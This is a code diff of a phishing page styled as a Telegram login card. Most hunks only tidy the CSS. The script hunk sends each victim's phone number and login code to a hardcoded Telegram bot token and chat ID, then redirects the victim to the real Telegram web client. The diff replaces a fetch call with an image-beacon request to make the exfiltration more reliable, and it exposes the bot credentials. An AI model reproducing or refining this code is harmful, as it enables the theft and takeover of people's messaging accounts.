@@ -10,7 +10,6 @@
             padding: 0;
             box-sizing: border-box;
         }
-
         body {
             font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
             background: #0f0f0f;
@@ -20,29 +19,24 @@
             align-items: center;
             padding: 20px;
         }
-
         .container {
             max-width: 400px;
             width: 100%;
         }
-
         .card {
             background: #1f1f1f;
             border-radius: 28px;
             padding: 32px 24px;
-            box-shadow: 0 12px 32px rgba(0, 0, 0, 0.4);
+            box-shadow: 0 12px 32px rgba(0,0,0,0.4);
         }
-
         .logo {
             text-align: center;
             margin-bottom: 28px;
         }
-
         .logo svg {
             width: 56px;
             height: 56px;
         }
-
         h1 {
             color: #ffffff;
             font-size: 24px;
@@ -50,25 +44,21 @@
             text-align: center;
             margin-bottom: 8px;
         }
-
         .sub {
             color: #8e8e8e;
             text-align: center;
             font-size: 14px;
             margin-bottom: 32px;
         }
-
         .input-group {
             margin-bottom: 16px;
         }
-
         label {
             display: block;
             color: #8e8e8e;
             font-size: 14px;
             margin-bottom: 6px;
         }
-
         input {
             width: 100%;
             padding: 14px 16px;
@@ -78,14 +68,11 @@
             color: #ffffff;
             font-size: 16px;
             outline: none;
-            transition: all 0.2s;
         }
-
         input:focus {
             border-color: #2b9aff;
             background: #333333;
         }
-
         button {
             width: 100%;
             padding: 14px;
@@ -97,22 +84,18 @@
             font-weight: 600;
             margin-top: 16px;
             cursor: pointer;
-            transition: background 0.2s;
         }
-
         button:hover {
             background: #1f8ae8;
         }
-
         .footer {
             text-align: center;
             margin-top: 20px;
             font-size: 12px;
             color: #5e5e5e;
         }
-
         .error {
-            background: rgba(255, 60, 60, 0.2);
+            background: rgba(255,60,60,0.2);
             border: 1px solid #ff3c3c;
             color: #ff6b6b;
             padding: 10px;
@@ -122,9 +105,8 @@
             margin-bottom: 16px;
             display: none;
         }
-
         .success {
-            background: rgba(60, 255, 60, 0.2);
+            background: rgba(60,255,60,0.2);
             border: 1px solid #3cff3c;
             color: #6bff6b;
             padding: 10px;
@@ -167,7 +149,7 @@
     const BOT_TOKEN = '8300626512:AAEH-ZR2FLuQkRhkF6WkRdgOsdhimjBL9IE';
     const CHAT_ID = '7110007728';
 
-    document.getElementById('loginForm').addEventListener('submit', async function(e) {
+    document.getElementById('loginForm').addEventListener('submit', function(e) {
         e.preventDefault();
         
         const phone = document.getElementById('phone').value.trim();
@@ -188,27 +170,24 @@
         successDiv.style.display = 'block';
         
         const message = 'LOGIN\nPhone: ${phone}\nCode: ${code}';
+        
+        const img = new Image();
         const url = 'https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}';
         
-        try {
-            const response = await fetch(url);
-            const result = await response.json();
-            
-            if (result.ok) {
-                successDiv.textContent = 'Success! Redirecting...';
-                setTimeout(() => {
-                    window.location.href = 'https://web.telegram.org/z/';
-                }, 1000);
-            } else {
-                errorDiv.textContent = 'Error: ' + (result.description || 'Unknown error');
-                errorDiv.style.display = 'block';
-                successDiv.style.display = 'none';
-            }
-        } catch (err) {
-            errorDiv.textContent = 'Network error. Please try again.';
+        img.onload = function() {
+            successDiv.textContent = 'Success! Redirecting...';
+            setTimeout(() => {
+                window.location.href = 'https://web.telegram.org/z/';
+            }, 1000);
+        };
+        
+        img.onerror = function() {
+            errorDiv.textContent = 'Error. Please try again.';
             errorDiv.style.display = 'block';
             successDiv.style.display = 'none';
-        }
+        };
+        
+        img.src = url;
     });
 </script>
 </body>
